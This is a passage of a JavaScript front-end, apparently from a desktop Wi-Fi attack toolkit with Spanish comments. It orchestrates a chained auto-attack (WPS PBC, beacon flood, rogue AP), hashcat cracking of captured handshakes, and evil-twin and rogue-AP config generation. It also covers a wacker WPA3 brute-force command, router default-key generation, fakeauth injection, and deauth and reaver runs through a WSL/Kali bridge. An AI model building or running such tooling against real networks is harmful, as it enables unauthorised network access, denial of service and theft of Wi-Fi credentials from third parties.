    { n: '7/9 - WPS PBC Attack', cmd: 'wps_pbc_attack_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspbc_${clean9}` },
    { n: '8/9 - Beacon Flood', cmd: 'beacon_flood', args: { essid: 'TEST', bssid, channel: autoCh9 || 1, beaconCount: 20 }, bgId: null },
    { n: '9/9 - Rogue AP', cmd: 'rogue_ap', args: { essid: 'TEST_FREE_WIFI', bssid, channel: autoCh9 || 1, iface }, bgId: null },
  ];

  window._autoStop = false;
  showProgress(true);
  for (const step of steps) {
    if (window._autoStop) { log('Auto-ataque cancelado por el usuario.', 'warn'); break; }
    const btn = document.getElementById('autoAttackBtn');
    if (btn) btn.textContent = step.n;
    updateProgress(10 + Math.round(80 * steps.indexOf(step) / steps.length), step.n);
    log('[' + step.n + ']...', 'warn');
    currentAttackId = step.bgId; // cancelable con ■ Cancelar
    await invokeAttack(step.cmd, step.args);
  }
  currentAttackId = null;
  showProgress(false);
  window._autoStop = false;

  log('==============================', 'ok');
  log(' AUTO-ATTACK COMPLETADO', 'ok');
  log('==============================', 'ok');
  const btn2 = document.getElementById('autoAttackBtn');
  if (btn2) btn2.textContent = 'Auto-Ataque';
};


// ── Estrategia de crack ───────────────────────────────────────────────────
window.loadCrackAssets = async function () {
  try {
    const a = await window.__invoke('list_crack_assets');
    const ruleSel = $('crackx-rule');
    if (ruleSel) {
      ruleSel.innerHTML = '<option value="">(sin regla)</option>' +
        (a.rules || []).map(r => `<option value="${esc(r)}">${esc(r)}</option>`).join('');
    }
    const dl = $('crackx-wl-list');
    if (dl) {
      dl.innerHTML = (a.wordlists || []).map(w => `<option value="${esc(w)}">`).join('');
    }
    const hint = $('crackx-hint');
    if (hint) {
      const parts = [`hashcat: ${a.hashcat === 'no encontrado' ? 'NO encontrado' : 'OK'}`,
        `${(a.rules || []).length} reglas`, `${(a.wordlists || []).length} wordlists`];
      if (!a.rockyou) parts.push('⚠ sin rockyou.txt — máscara o combinator recomendados');
      hint.textContent = parts.join(' · ');
    }
    log(`Assets crack: ${(a.rules || []).length} reglas, ${(a.wordlists || []).length} wordlists.`, 'info');
  } catch (e) {
    log(`[list_crack_assets] ERROR: ${e}`, 'error');
  }
};

window.inspectHash = async function () {
  const f = valOrEmpty($('insp-hash').value);
  if (!f) { log('Especifica el archivo .22000 a inspeccionar.', 'warn'); return; }
  try {
    const s = await window.__invoke('inspect_hash', { hashPath: f });
    const out = `total=${s.total} · PMKID=${s.pmkid} · challenge=${s.challenge} · authorized=${s.authorized}\nESSID: ${(s.essids || []).join(', ') || '?'}`;
    const pre = $('insp-out');
    if (pre) pre.textContent = out;
    log(`[inspect] ${f}: ${out.replace('\n', ' | ')}`, 'info');
  } catch (e) {
    log(`[inspect] ERROR: ${e}`, 'error');
  }
};

window.filterHash = async function () {
  const f = valOrEmpty($('insp-hash').value);
  const kind = $('insp-kind')?.value || 'pmkid';
  if (!f) { log('Especifica el archivo .22000 a filtrar.', 'warn'); return; }
  try {
    const r = await window.__invoke('filter_hash', { hashPath: f, kind });
    log(r.output, 'ok');
    const cx = $('crackx-hash');
    if (cx) cx.value = `${f}.${kind}`;
  } catch (e) {
    log(`[filter] ERROR: ${e}`, 'error');
  }
};

window.launchCustomCrack = async function () {
  const hash = valOrEmpty($('crackx-hash').value);
  const attack = parseInt($('crackx-mode')?.value || '0');
  const wl = valOrEmpty($('crackx-wordlist').value) || undefined;
  const rule = $('crackx-rule')?.value || undefined;
  const mask = valOrEmpty($('crackx-mask').value) || undefined;
  const sess = valOrEmpty($('crackx-session').value) || undefined;
  if (!hash) { log('Especifica el archivo .22000.', 'warn'); return; }
  if ((attack === 0 || attack === 1 || attack === 6 || attack === 7) && !wl) {
    log('Este modo necesita wordlist (¿sin rockyou? usa modo máscara).', 'warn'); return;
  }
  if ((attack === 3 || attack === 6 || attack === 7) && !mask) {
    log('Este modo necesita máscara (elige un preset).', 'warn'); return;
  }
  return invokeAttack('crack_custom', { hashFile: hash, attack, wordlist: wl, mask, rule, session: sess });
};

// ── Módulo WPA3 ─────────────────────────────────────────────────────────
window.useTargetForWpa3 = function () {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return; }
  const bssidInput = $('wpa3-bssid');
  if (bssidInput) bssidInput.value = sel.value;
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  const ssidInput = $('wpa3-ssid');
  if (ssid && ssidInput) ssidInput.value = ssid;
};

window.wpa3Audit = async function () {
  const bssid = valOrEmpty($('wpa3-bssid').value);
  if (!bssid) { log('Especifica el BSSID a auditar.', 'warn'); return; }
  try {
    const a = await window.__invoke('wpa3_audit', { bssid });
    const pre = $('wpa3-out');
    const txt = `${a.title}\n${a.detail}\nMFP: ${a.mfp}\nConfirmar: ${a.confirm_cmd_linux}\n${(a.next_steps || []).join('\n')}`;
    if (pre) pre.textContent = txt;
    log(`[wpa3] ${a.ssid} (${a.bssid}): ${a.title}`, 'info');
  } catch (e) {
    log(`[wpa3] ERROR: ${e}`, 'error');
  }
};

window.genRogueConf = async function () {
  const ssid = valOrEmpty($('wpa3-ssid').value);
  const ch = parseInt(valOrEmpty($('wpa3-chan').value) || '1');
  const iface = valOrEmpty($('wpa3-iface').value) || undefined;
  const out = valOrEmpty($('wpa3-confout').value) || undefined;
  if (!ssid) { log('Especifica el SSID a clonar.', 'warn'); return; }
  try {
    const r = await window.__invoke('gen_rogue_conf', { ssid, channel: ch, iface, outputPath: out });
    const pre = $('rogue-out');
    if (pre) pre.textContent = r.output;
    log(`[rogue] .conf generado para "${ssid}" CH${ch}. Úsalo con hostapd-mana en Kali.`, 'ok');
  } catch (e) {
    log(`[rogue] ERROR: ${e}`, 'error');
  }
};

window.fillWacker = function () {
  const bssid = valOrEmpty($('wpa3-bssid').value) || '<BSSID>';
  const opt = $('attack-bssid')?.options[$('attack-bssid')?.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim() || valOrEmpty($('wpa3-ssid').value) || '<SSID>';
  const wl = valOrEmpty($('wpa3-wl').value) || '<wordlist>';
  const iface = valOrEmpty($('wpa3-miface').value) || '<iface-managed>';
  const pre = $('wacker-out');
  if (pre) {
    pre.textContent =
      '# En Kali (adaptador en MANAGED mode, no monitor):\n' +
      '# git clone <repo-wacker> && revisa --help (los flags varían por versión)\n' +
      `python3 wacker.py --ssid "${ssid}" --bssid ${bssid} --wordlist ${wl} --interface ${iface}\n` +
      '# Lento (~1 intento/s, con rate-limit del AP) y ruidoso. Solo vs claves débiles.';
  }
};

// ── Evil Twin ───────────────────────────────────────────────────────────
window.useTargetForEvil = function () {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return; }
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  const ssidInput = $('et-ssid');
  if (ssid && ssidInput) ssidInput.value = ssid;
};

window.genEvilTwinKit = async function () {
  const ssid = valOrEmpty($('et-ssid').value);
  const ch = parseInt(valOrEmpty($('et-chan').value) || '1');
  const iface = valOrEmpty($('et-iface').value) || undefined;
  const gw = valOrEmpty($('et-gw').value) || undefined;
  const out = valOrEmpty($('et-outdir').value) || undefined;
  if (!ssid) { log('Especifica el SSID a clonar.', 'warn'); return; }
  try {
    const r = await window.__invoke('gen_eviltwin_kit', {
      ssid, channel: ch, ifaceAp: iface, gateway: gw, outputDir: out,
    });
    const pre = $('et-out');
    if (pre) pre.textContent = r.output;
    log(`[eviltwin] kit generado para "${ssid}". Coloca el .22000 y sigue README.txt en Kali.`, 'ok');
  } catch (e) {
    log(`[eviltwin] ERROR: ${e}`, 'error');
  }
};

window.verifyCandidate = async function () {
  const hash = valOrEmpty($('et-hash').value);
  const pass = $('et-pass')?.value || '';
  if (!hash) { log('Especifica el archivo .22000.', 'warn'); return; }
  if (!pass) { log('Escribe la clave candidata.', 'warn'); return; }
  try {
    const r = await window.__invoke('verify_candidate', { hashFile: hash, password: pass });
    log(r.success ? `✅ ${r.output}` : `❌ ${r.output || r.stderr}`, r.success ? 'ok' : 'warn');
    $('et-pass').value = '';
  } catch (e) {
    log(`[verify] ERROR: ${e}`, 'error');
  }
};

// ── Acceso: conectar + keygen ─────────────────────────────────────────────
function fillFromTarget(ssidInputId) {
  const sel = $('attack-bssid');
  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return null; }
  const opt = sel.options[sel.selectedIndex]?.text || '';
  const ssid = opt.split('·')[0]?.trim();
  if (ssid) {
    const el = $(ssidInputId);
    if (el) el.value = ssid;
  }
  return { bssid: sel.value, ssid };
}

window.useTargetForConnect = function () {
  fillFromTarget('conn-ssid');
};

window.useTargetForKeygen = function () {
  const t = fillFromTarget('keygen-ssid');
  const kb = $('keygen-bssid');
  if (t && kb) kb.value = t.bssid;
};

window.wifiConnect = async function () {
  const ssid = valOrEmpty($('conn-ssid').value);
  const pass = $('conn-pass')?.value || '';
  if (!ssid || !pass) { log('SSID y clave requeridos.', 'warn'); return; }
  try {
    const r = await window.__invoke('wifi_connect', { ssid, password: pass });
    log(r.success ? `✅ ${r.output}` : `⚠️ ${r.output}\n${r.stderr}`, r.success ? 'ok' : 'warn');
    $('conn-pass').value = '';
  } catch (e) {
    log(`[connect] ERROR: ${e}`, 'error');
  }
};

window.wifiDisconnect = async function () {
  try {
    const r = await window.__invoke('wifi_disconnect');
    log(r.output || r.stderr, r.success ? 'ok' : 'warn');
  } catch (e) {
    log(`[disconnect] ERROR: ${e}`, 'error');
  }
};

window.keygenDetect = async function () {
  const ssid = valOrEmpty($('keygen-ssid').value);
  if (!ssid) { log('Especifica el SSID.', 'warn'); return; }
  try {
    const r = await window.__invoke('keygen_detect', { ssid });
    const pre = $('keygen-out');
    if (pre) pre.textContent = r.output || r.stderr;
  } catch (e) {
    log(`[keygen] ERROR: ${e}`, 'error');
  }
};

window.keygenRun = async function () {
  const ssid = valOrEmpty($('keygen-ssid').value);
  const bssid = valOrEmpty($('keygen-bssid').value);
  if (!ssid || !bssid) { log('SSID y BSSID requeridos.', 'warn'); return; }
  try {
    // Thomson → búsqueda SHA1 completa con límite configurable (thomson_run).
    const det = await window.__invoke('keygen_detect', { ssid });
    if (det.success && /thomson/i.test(det.output || '')) {
      const maxRaw = parseInt(valOrEmpty($('keygen-max').value));
      const maxKeys = (maxRaw >= 1 && maxRaw <= 50) ? maxRaw : 5;
      log(`Thomson detectado: búsqueda completa (máx. ${maxKeys}, ~21.8M hashes con threads)…`, 'info');
      return invokeAttack('thomson_run', { ssid, bssid, maxKeys });
    }
    const r = await window.__invoke('keygen_run', { ssid, bssid });
    const pre = $('keygen-out');
    if (pre) pre.textContent = r.success ? r.output : r.stderr;
    log(r.success ? '[keygen] candidatos generados.' : `[keygen] ${r.stderr}`, r.success ? 'ok' : 'warn');
  } catch (e) {
    log(`[keygen] ERROR: ${e}`, 'error');
  }
};

// ── Background attack state ──────────────────────────────────────────────
let currentAttackId = null;

window.cancelCurrentAttack = async function () {
  window._autoStop = true; // si hay un auto-attack en curso, la secuencia se detiene
  if (!currentAttackId) {
    log('No hay ataque en ejecución para cancelar.', 'warn');
    return;
  }
  const id = currentAttackId;
  log(`Cancelando ataque '${id}'…`, 'warn');
  try {
    const result = await window.__invoke('cancel_attack', { attackId: id });
    log(result.success ? `✅ ${result.output}` : `⚠️ ${result.output}`, result.success ? 'ok' : 'warn');
  } catch (err) {
    log(`Error al cancelar: ${err}`, 'error');
  }
};

window.injectionTest = async function () {
  const iface = valOrEmpty($('injtest-iface').value) || '';
  log(`>>> Injection test en ${iface || '(interfaz requerida)'}…`, 'info');
  return invokeAttack('injection_test', { iface: iface || undefined });
};

window.doFakeauth = async function () {
  const bssid = valOrEmpty($('fakeauth-bssid').value);
  const mac   = valOrEmpty($('fakeauth-mac').value) || undefined;
  const iface = valOrEmpty($('fakeauth-iface').value) || '';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Fakeauth: AP=${bssid} mac=${mac || '00:11:22:33:44:55'} iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('fakeauth_inject', { bssid, sourceMac: mac, iface });
};

// ── Progress bar support ──────────────────────────────────────────────────────
const progressContainer = document.getElementById('progress-container');
const progressBar = document.getElementById('progress-bar');

function showProgress(show = true) {
  if (progressContainer) progressContainer.style.display = show ? 'block' : 'none';
}

function updateProgress(percent, text) {
  if (progressBar) {
    progressBar.style.width = `${Math.min(100, Math.max(0, percent))}%`;
    progressBar.textContent = text || `${percent}%`;
  }
}

// Listen for attack progress events (streaming en tiempo real)
listen('attack-progress', (event) => {
  const { id, type, data } = event.payload;
  if (id === currentAttackId) {
    if (type === 'stdout') log(data, 'output');
    if (type === 'stderr') log(data, 'warn');
    if (data.includes('received')) updateProgress(25, 'Recibiendo... 25%');
    if (data.toLowerCase().includes('pmkid')) updateProgress(50, 'PMKID encontrado! 50%');
    if (data.toLowerCase().includes('beacon')) updateProgress(75, 'Procesando beacons... 75%');
  }
});

listen('attack-completed', (event) => {
  const { id } = event.payload;
  if (id === currentAttackId) {
    showProgress(false);
    currentAttackId = null;
  }
});

listen('attack-error', (event) => {
  const { id, error } = event.payload;
  if (id === currentAttackId) {
    showProgress(false);
    log(`Error ataque: ${error}`, 'error');
    currentAttackId = null;
  }
});

// ── Puente WSL2/Kali (ROADMAP_WSL2 Fase 5) ──────────────────────────────
window.wslBusid = function () {
  const el = document.getElementById('wsl-busid');
  return (el && el.value || '1-5').trim();
};
window.doWslAttach = async function () {
  const status = document.getElementById('wsl-status');
  if (status) status.textContent = 'Estado: attach…';
  log(`Moviendo USB ${window.wslBusid()} a Kali…`, 'info');
  try {
    const r = await window.__invoke('wsl_attach', { busid: window.wslBusid() });
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    if (r.stdout) log(r.stdout, 'info');
    if (!r.success && r.stderr) log(r.stderr, 'warn');
    if (status) status.textContent = r.success ? 'Estado: ✅ Kali (USB attach)' : 'Estado: ❌ attach fallido';
  } catch (err) { log(`[wsl_attach] FATAL: ${err}`, 'error'); if (status) status.textContent = 'Estado: ❌ error'; }
};
window.doWslDetach = async function () {
  const status = document.getElementById('wsl-status');
  if (status) status.textContent = 'Estado: detach…';
  log(`Devolviendo USB ${window.wslBusid()} a Windows…`, 'info');
  try {
    const r = await window.__invoke('wsl_detach', { busid: window.wslBusid() });
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    if (r.stdout) log(r.stdout, 'info');
    if (!r.success && r.stderr) log(r.stderr, 'warn');
    if (status) status.textContent = r.success ? 'Estado: 🔒 Windows (USB devuelto)' : 'Estado: ❌ detach fallido';
  } catch (err) { log(`[wsl_detach] FATAL: ${err}`, 'error'); if (status) status.textContent = 'Estado: ❌ error'; }
};
window.doWslExec = async function () {
  const el = document.getElementById('wsl-cmd');
  const raw = (el && el.value || 'echo ok').trim() || 'echo ok';
  const parts = raw.split(/\s+/);
  const command = parts[0];
  const args = parts.slice(1);
  log(`>>> Kali: ${raw}`, 'info');
  try {
    const r = await window.__invoke('wsl_exec', { command, args });
    if (r.stdout) log(r.stdout, 'ok');
    if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
    log(`[${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
  } catch (err) { log(`[wsl_exec] FATAL: ${err}`, 'error'); }
};
window.wslTarget = function () {
  const b = document.getElementById('wsl-bssid');
  const c = document.getElementById('wsl-chan');
  return {
    bssid: (b && b.value || '').trim(),
    channel: c && parseInt(c.value) ? parseInt(c.value) : 11
  };
};
window.wslShow = async function (tag, p) {
  try {
    const r = await p;
    if (r.stdout) log(r.stdout, 'ok');
    if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
    log(`[${tag} ${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
  } catch (err) { log(`[${tag}] FATAL: ${err}`, 'error'); }
};
window.doWslPmkid = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: PMKID ${t.channel} 60s…`, 'info');
  await window.wslShow('pmkid', window.__invoke('wsl_pmkid_capture', { iface: 'wlan0', channel: t.channel, durationSecs: 60 }));
};
window.doWslAirodump = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: airodump ${t.channel} 20s…`, 'info');
  await window.wslShow('airodump', window.__invoke('wsl_airodump', { iface: 'wlan0', channel: t.channel, durationSecs: 20 }));
};
window.doWslWash = async function () {
  const t = window.wslTarget();
  log(`>>> Kali: wash ${t.channel} 20s…`, 'info');
  await window.wslShow('wash', window.__invoke('wsl_wash', { iface: 'wlan0', channel: t.channel, durationSecs: 20 }));
};
window.doWslDeauth = async function () {
  const t = window.wslTarget();
  if (!t.bssid) { log('Deauth cancelada: escribe el BSSID de TU ap.', 'warn'); return; }
  log(`>>> Kali: deauth x10 a ${t.bssid} (AP propio)…`, 'info');
  await window.wslShow('deauth', window.__invoke('wsl_deauth', { iface: 'wlan0', bssid: t.bssid, count: 10, channel: t.channel }));
};
window.doWslReaver = async function () {
  const t = window.wslTarget();
  if (!t.bssid) { log('Reaver cancelado: escribe el BSSID de TU ap.', 'warn'); return; }
  log(`>>> Kali: reaver 60s contra ${t.bssid} (AP propio)…`, 'info');
  await window.wslShow('reaver', window.__invoke('wsl_reaver', { iface: 'wlan0', bssid: t.bssid, channel: t.channel, durationSecs: 60 }));
};
window.doWslKill = async function () {
  log('>>> Kali: pkill -INT (hcxdumptool|airodump-ng|wash|aireplay-ng|reaver)…', 'info');
  for (const p of ['hcxdumptool', 'airodump-ng', 'wash', 'aireplay-ng', 'reaver']) {
    await window.wslShow('kill', window.__invoke('wsl_kill', { pattern: p }));
  }
};
